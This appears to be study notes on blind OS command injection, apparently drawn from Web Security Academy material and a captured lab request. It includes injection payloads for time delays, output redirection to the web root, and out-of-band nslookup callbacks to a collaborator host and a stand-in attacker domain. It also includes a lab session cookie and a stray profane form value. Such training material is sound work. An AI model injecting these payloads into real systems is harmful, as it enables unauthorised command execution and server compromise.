# OS command injection

OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data.

## Blind OS command injection vulnerabilities

Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required. 
        
   mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com

### Detecting blind OS command injection using time delays
 
  You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. 

        & ping -c 10 127.0.0.1 &

### Blind OS command injection with output redirection

   Exploiting blind OS command injection by redirecting output

You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location 

/var/www/static, then you can submit the following input:

   & whoami > /var/www/static/whoami.txt &

The > character sends the output from the whoami command to the specified file. You can then use the browser to fetch https://0af3008203ae105f84d1d7dc00b3002b.web-security-academy.net/image?filename=output.txt to retrieve the file, and view the output from the injected command. 

### Exploiting blind OS command injection using out-of-band (OAST) techniques

      POST /feedback/submit HTTP/2
      Host: 0a3b009d04c7460785b978660080009a.web-security-academy.net
      Cookie: session=RsOdr2OGqTvLMngAWf4lAr7KxF7zF6si
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
      Accept: */*
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 148
      Origin: https://0a3b009d04c7460785b978660080009a.web-security-academy.net
      Referer: https://0a3b009d04c7460785b978660080009a.web-security-academy.net/feedback
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Priority: u=0
      Te: trailers

      csrf=GLo6BPgbSSp5C2jThOF1vDyUWxAfUqHx&name=asd&email=||nslookup+x.r7zc1l3dghvxn854kh4x6t0jaag14rsg.oastify.com||&subject=sadf&message=bitch+is+bitch**'

 You can use an injected command that will trigger an out-of-band network interaction with a system that youcontrol, using OAST techniques. For example:

   & nslookup kgji2ohoyw.web-attacker.com &

This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected